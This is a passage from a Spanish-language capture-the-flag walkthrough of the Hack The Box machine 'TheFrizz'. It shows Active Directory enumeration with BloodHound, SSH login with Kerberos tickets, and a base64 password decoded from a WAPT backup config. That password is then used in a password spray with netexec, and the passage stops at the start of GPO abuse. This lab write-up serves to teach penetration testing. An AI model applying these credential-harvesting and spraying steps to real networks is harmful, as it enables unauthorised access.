<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ <span class="nv">KRB5CCNAME</span><span class="o">=</span>f.frizzle.ccache bloodhound-python -u <span class="s1">&#39;f.frizzle&#39;</span> -k -no-pass -d frizz.htb -dc frizzdc.frizz.htb -ns 10.10.11.60 -c all --zip
</span></span><span class="line"><span class="cl">INFO: BloodHound.py <span class="k">for</span> BloodHound LEGACY <span class="o">(</span>BloodHound 4.2 and 4.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">INFO: Found AD domain: frizz.htb
</span></span><span class="line"><span class="cl">INFO: Using TGT from cache
</span></span><span class="line"><span class="cl">INFO: Found TGT with correct principal in ccache file.
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: frizzdc.frizz.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> computers
</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: frizzdc.frizz.htb
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">22</span> users
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">53</span> groups
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> gpos
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> ous
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">19</span> containers
</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
</span></span><span class="line"><span class="cl">INFO: Querying computer: frizzdc.frizz.htb
</span></span><span class="line"><span class="cl">INFO: Done in 00M 40S
</span></span><span class="line"><span class="cl">INFO: Compressing output into 20250328045527_bloodhound.zip
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>Con la version de <a href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart">Bloodhound-CE</a> cargamos el archivo .zip generado anteriormente.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134271255.png"></p>
<h3 id="ffrizzle">F.Frizzle</h3>
<p>f.frizzle no parece tener algun permiso interesante, aunque pertenece al grupo Remote Management Users, sin embargo el puerto WinRM no esta abierto.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134275051.png"></p>
<p>Otro miembro de este mismo grupo es M.SchoolBus.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134275234.png"></p>
<h3 id="m-schoolbus">M SchoolBus</h3>
<p>M.SchoolBus, pertenece al grupo Desktop Admins y <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#group-policy-creator-owners">Group Policy Creator Owners</a>, entre los mas destacados. Este ultimo permite <strong>modificar, crear y eliminar</strong> GPOs, de existir alguna marcada como <a href="https://www.semperis.com/blog/group-policy-abuse-explained/">&ldquo;vulnerable&rdquo;</a> es posible abusar de esta.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134270146.png"></p>
<p>Se observa que tambien tiene permisos sobre varios usuarios, el permiso <code>WriteGPLink</code> sobre dos OU.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134272452.png"></p>
<p>Por el momento no se muestra algo que nos permita el acceso desde f.frizzle a M.Schoolbus.</p>
<h2 id="shell---ssh-kerberos">Shell - SSH Kerberos</h2>
<p>Modificamos el archivo <code>/etc/krb5.conf</code> con la configuracion para frizz.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ cat /etc/krb5.conf
</span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
</span></span><span class="line"><span class="cl">	<span class="nv">default_realm</span> <span class="o">=</span> FRIZZ.HTB
</span></span><span class="line"><span class="cl">	<span class="nv">dns_lookup_realm</span> <span class="o">=</span> <span class="nb">false</span>
</span></span><span class="line"><span class="cl">	<span class="nv">dns_lookup_kdc</span> <span class="o">=</span> <span class="nb">false</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>
</span></span><span class="line"><span class="cl">    FRIZZ.HTB <span class="o">=</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> frizzdc.frizz.htb
</span></span><span class="line"><span class="cl">        <span class="nv">admin_server</span> <span class="o">=</span> frizzdc.frizz.htb
</span></span><span class="line"><span class="cl">        <span class="nv">default_domain</span> <span class="o">=</span> frizz.htb
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
</span></span><span class="line"><span class="cl">    frizz.htb <span class="o">=</span> FRIZZ.HTB
</span></span><span class="line"><span class="cl">    .frizz.htb <span class="o">=</span> FRIZZ.HTB
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>Especificamos el ticket en la variable de entorno y ejecutamos SSH con autenticacion Kerberos.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>f.frizzle.ccache <span class="p">;</span>ssh -K f.frizzle@frizz.htb
</span></span></code></pre></td></tr></table>
</div>
</div><p>Logrando el acceso como f.frizzle y la flag <code>user.txt</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PowerShell 7.4.5
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle&gt; whoami
</span></span><span class="line"><span class="cl">frizz<span class="se">\f</span>.frizzle
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle&gt; ls
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">d-r--          10/29/2024  7:31 AM                Desktop
</span></span><span class="line"><span class="cl">d-r--          10/29/2024  7:27 AM                Documents
</span></span><span class="line"><span class="cl">d-r--            5/8/2021  1:15 AM                Downloads
</span></span><span class="line"><span class="cl">d-r--            5/8/2021  1:15 AM                Favorites
</span></span><span class="line"><span class="cl">d-r--            5/8/2021  1:15 AM                Links
</span></span><span class="line"><span class="cl">d-r--            5/8/2021  1:15 AM                Music
</span></span><span class="line"><span class="cl">d-r--            5/8/2021  1:15 AM                Pictures
</span></span><span class="line"><span class="cl">d----            5/8/2021  1:15 AM                Saved Games
</span></span><span class="line"><span class="cl">d-r--            5/8/2021  1:15 AM                Videos
</span></span><span class="line"><span class="cl">-a---          10/24/2024  9:16 PM       <span class="m">30416987</span> wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle&gt; <span class="nb">cd</span> Desktop
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle<span class="se">\D</span>esktop&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
</span></span><span class="line"><span class="cl">-ar--           3/20/2025  4:28 AM             <span class="m">34</span> user.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
</span></span><span class="line"><span class="cl">d92f562b7c5e9cb09e62b4c3b9607673
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle<span class="se">\D</span>esktop&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="user---mschoolbus">User - M.SchoolBus</h1>
<h2 id="backup">Backup</h2>
<p>En el directorio de f.frizzle encontramos un archivo <code>7z</code> el nombre indica que es un backup.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle&gt; Get-FileHash wapt-backup-sunday.7z -Algorithm SHA256
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Algorithm       Hash                                                                   Path
</span></span><span class="line"><span class="cl">---------       ----                                                                   ----
</span></span><span class="line"><span class="cl">SHA256          EC05B7ABEF51628BDB76DC33427462068F075C188618A505EFC589EFBA43DFDD       C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle<span class="se">\w</span>apt-backup-sunday.7z
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\f</span>.frizzle&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Utilizando <code>scp</code> copiamos el archivo a nuestra maquina.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>../f.frizzle.ccache <span class="p">;</span> scp -o <span class="nv">GSSAPIAuthentication</span><span class="o">=</span>yes f.frizzle@frizz.htb:C:/Users/f.frizzle/wapt-backup-sunday.7z .
</span></span><span class="line"><span class="cl">wapt-backup-sunday.7z                                                                                                                                 100%   29MB   1.0MB/s   00:27    
</span></span><span class="line"><span class="cl">â¯ ll wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl">.rw------- kali kali <span class="m">29</span> MB Thu Mar <span class="m">20</span> 10:16:59 <span class="m">2025</span> ï wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl">â¯
</span></span><span class="line"><span class="cl">â¯ sha256sum wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl">ec05b7abef51628bdb76dc33427462068f075c188618a505efc589efba43dfdd  wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl">â¯ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Extrajimos el contenido de este.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ 7z x wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">7-Zip 24.09 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2024 Igor Pavlov : 2024-11-29
</span></span><span class="line"><span class="cl"> 64-bit <span class="nv">locale</span><span class="o">=</span>en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scanning the drive <span class="k">for</span> archives:
</span></span><span class="line"><span class="cl"><span class="m">1</span> file, <span class="m">30416987</span> bytes <span class="o">(</span><span class="m">30</span> MiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extracting archive: wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl"><span class="nv">Path</span> <span class="o">=</span> wapt-backup-sunday.7z
</span></span><span class="line"><span class="cl"><span class="nv">Type</span> <span class="o">=</span> 7z
</span></span><span class="line"><span class="cl">Physical <span class="nv">Size</span> <span class="o">=</span> <span class="m">30416987</span>
</span></span><span class="line"><span class="cl">Headers <span class="nv">Size</span> <span class="o">=</span> <span class="m">65880</span>
</span></span><span class="line"><span class="cl"><span class="nv">Method</span> <span class="o">=</span> ARM64 LZMA2:26 LZMA:20 BCJ2
</span></span><span class="line"><span class="cl"><span class="nv">Solid</span> <span class="o">=</span> +
</span></span><span class="line"><span class="cl"><span class="nv">Blocks</span> <span class="o">=</span> <span class="m">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Everything is Ok                                                           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Folders: <span class="m">684</span>
</span></span><span class="line"><span class="cl">Files: <span class="m">5384</span>
</span></span><span class="line"><span class="cl">Size:       <span class="m">141187501</span>
</span></span><span class="line"><span class="cl">Compressed: <span class="m">30416987</span>
</span></span><span class="line"><span class="cl">â¯ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Se observa que la version de <a href="https://www.wapt.fr/en/doc/">WAPT</a> es 2.5.5.15697-20422a0b.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ ls wapt
</span></span><span class="line"><span class="cl">î˜† __pycache__  ï„¡ lib                     î˜† auth_module_ad.py   î˜† setuphelpers_linux.py    ï€– wapt-get.exe.manifest  ï€– waptconsole.exe.manifest  ï…º waptself.exe        ï…º wgetwads64.exe
</span></span><span class="line"><span class="cl">ó°ƒ¨ cache        ï„• log                     î˜† common.py           î˜† setuphelpers_macos.py    î˜• wapt-get.ini           î˜† waptcrypto.py             ï…º waptserver.exe      
</span></span><span class="line"><span class="cl">ï„• conf         ï„• private                 ï…œ COPYING.txt         î˜† setuphelpers_unix.py     ï€– wapt-get.ini.tmpl      ï€– waptguihelper.pyd         ï…º waptservice.exe     
</span></span><span class="line"><span class="cl">î—¼ conf.d       ï’‰ Scripts                 î˜† keyfinder.py        î˜† setuphelpers_windows.py  î˜† wapt-get.py            ï€– waptlicences.pyd          ï€– wapttftpserver      
</span></span><span class="line"><span class="cl">ï„• db           ï„• ssl                     î˜† licencing.py        ï€– unins000.msg             î˜† wapt-scanpackages.py   ï…º waptmessage.exe           ï…º wapttftpserver.exe  
</span></span><span class="line"><span class="cl">ï„• DLLs         ï„• templates               ï…œ revision.txt        ï€– version-full             î˜† wapt-signpackages.py   î˜† waptpackage.py            ï…º wapttray.exe        
</span></span><span class="line"><span class="cl">ï„• keys         ï„• trusted_external_certs  î˜† setupdevhelpers.py  ï‡… wapt-enterprise.ico      ï€– wapt.psproj            ï…º waptpython.exe            î˜† waptutils.py        
</span></span><span class="line"><span class="cl">ï„• languages    ï„• waptwua                 î˜† setuphelpers.py     ï…º wapt-get.exe             ï€– waptbinaries.sha256    ï…º waptpythonw.exe           ï…º wgetwads32.exe      
</span></span><span class="line"><span class="cl">â¯ 
</span></span><span class="line"><span class="cl">â¯ cat version-full
</span></span><span class="line"><span class="cl">2.5.5.15697-20422a0b
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>Dentro del archivo de configruacion encontramos una contrasena.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ cat conf/waptserver.ini
</span></span><span class="line"><span class="cl"><span class="o">[</span>options<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">allow_unauthenticated_registration</span> <span class="o">=</span> True
</span></span><span class="line"><span class="cl"><span class="nv">wads_enable</span> <span class="o">=</span> True
</span></span><span class="line"><span class="cl"><span class="nv">login_on_wads</span> <span class="o">=</span> True
</span></span><span class="line"><span class="cl"><span class="nv">waptwua_enable</span> <span class="o">=</span> True
</span></span><span class="line"><span class="cl"><span class="nv">secret_key</span> <span class="o">=</span> ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
</span></span><span class="line"><span class="cl"><span class="nv">server_uuid</span> <span class="o">=</span> 646d0847-f8b8-41c3-95bc-51873ec9ae38
</span></span><span class="line"><span class="cl"><span class="nv">token_secret_key</span> <span class="o">=</span> 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
</span></span><span class="line"><span class="cl"><span class="nv">wapt_password</span> <span class="o">=</span> <span class="nv">IXN1QmNpZ0BNZWhUZWQhUgo</span><span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="nv">clients_signing_key</span> <span class="o">=</span> C:<span class="se">\w</span>apt<span class="se">\c</span>onf<span class="se">\c</span>a-192.168.120.158.pem
</span></span><span class="line"><span class="cl"><span class="nv">clients_signing_certificate</span> <span class="o">=</span> C:<span class="se">\w</span>apt<span class="se">\c</span>onf<span class="se">\c</span>a-192.168.120.158.crt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>tftpserver<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">root_dir</span> <span class="o">=</span> c:<span class="se">\w</span>apt<span class="se">\w</span>aptserver<span class="se">\r</span>epository<span class="se">\w</span>ads<span class="se">\p</span>xe
</span></span><span class="line"><span class="cl"><span class="nv">log_path</span> <span class="o">=</span> c:<span class="se">\w</span>apt<span class="se">\l</span>og
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â¯ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Esta codificado en base64 por lo que logramos obtener su valor.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">IXN1QmNpZ0BNZWhUZWQhUgo</span><span class="o">=</span> : !suBcig@MehTed!R
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="password-spraying">Password Spraying</h2>
<p>Obtuvimos la lista de usuarios del archivo de bloodhound.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ jq -r <span class="s1">&#39;.data[].Properties.name&#39;</span> 20250328045527_users.json <span class="p">|</span> cut -d <span class="s2">&#34;@&#34;</span> -f1 <span class="p">|</span> uniq <span class="p">|</span> tail -n +2
</span></span><span class="line"><span class="cl">M.RAMON
</span></span><span class="line"><span class="cl">W.WEBSERVICE
</span></span><span class="line"><span class="cl">C.RAMON
</span></span><span class="line"><span class="cl">C.SANDIEGO
</span></span><span class="line"><span class="cl">G.FRIZZLE
</span></span><span class="line"><span class="cl">V.FRIZZLE
</span></span><span class="line"><span class="cl">P.TERESE
</span></span><span class="line"><span class="cl">J.PERLSTEIN
</span></span><span class="line"><span class="cl">A.PERLSTEIN
</span></span><span class="line"><span class="cl">R.TENNELLI
</span></span><span class="line"><span class="cl">L.AWESOME
</span></span><span class="line"><span class="cl">M.SCHOOLBUS
</span></span><span class="line"><span class="cl">T.WRIGHT
</span></span><span class="line"><span class="cl">K.FRANKLIN
</span></span><span class="line"><span class="cl">D.HUDSON
</span></span><span class="line"><span class="cl">H.ARM
</span></span><span class="line"><span class="cl">W.LI
</span></span><span class="line"><span class="cl">F.FRIZZLE
</span></span><span class="line"><span class="cl">KRBTGT
</span></span><span class="line"><span class="cl">GUEST
</span></span><span class="line"><span class="cl">ADMINISTRATOR
</span></span><span class="line"><span class="cl">â¯ jq -r <span class="s1">&#39;.data[].Properties.name&#39;</span> 20250328045527_users.json <span class="p">|</span> cut -d <span class="s2">&#34;@&#34;</span> -f1 <span class="p">|</span> uniq <span class="p">|</span> tail -n +2 &gt; users.txt
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>Con el wordlist de usuarios ejecutamos password spraying, observamos que la contrasena pertenece a M.SchoolBus.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ netexec ldap 10.10.11.60 -u users.txt -p <span class="s2">&#34;\!suBcig@MehTed\!R&#34;</span> -k <span class="p">|</span> grep +
</span></span><span class="line"><span class="cl">LDAP        10.10.11.60     <span class="m">389</span>    frizzdc.frizz.htb <span class="o">[</span>+<span class="o">]</span> frizz.htb<span class="se">\M</span>.SCHOOLBUS:!suBcig@MehTed!R
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="shell">Shell</h2>
<p>Obtuvimos un ticket para M.SchoolBus y con este nos autenticamos por SSH.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ impacket-getTGT frizz.htb/M.SchoolBus:<span class="s1">&#39;!suBcig@MehTed!R&#39;</span>
</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in M.SchoolBus.ccache
</span></span><span class="line"><span class="cl">â¯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>M.SchoolBus.ccache <span class="p">;</span>ssh -K M.SchoolBus@frizz.htb
</span></span></code></pre></td></tr></table>
</div>
</div><p>Logrando el acceso a este usuario.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PowerShell 7.4.5
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus&gt; whoami
</span></span><span class="line"><span class="cl">frizz<span class="se">\m</span>.schoolbus
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="privesc">Privesc</h1>
<h2 id="gpo-abuse">GPO Abuse</h2>
<p>Bloodhound no muestra ningun GPO &ldquo;vulnerable&rdquo;, ademas los existentes unicamente son modificables por el grupo &ldquo;Domain Admins&rdquo;.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; Get-GPO -All -Domain <span class="s2">&#34;frizz.htb&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DisplayName      : Default Domain Policy
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\D</span>omain Admins
</span></span><span class="line"><span class="cl">Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">CreationTime     : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">ModificationTime : 10/29/2024 7:25:44 AM
</span></span><span class="line"><span class="cl">UserVersion      : 
</span></span><span class="line"><span class="cl">ComputerVersion  : 
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DisplayName      : Default Domain Controllers Policy
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\D</span>omain Admins
</span></span><span class="line"><span class="cl">Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
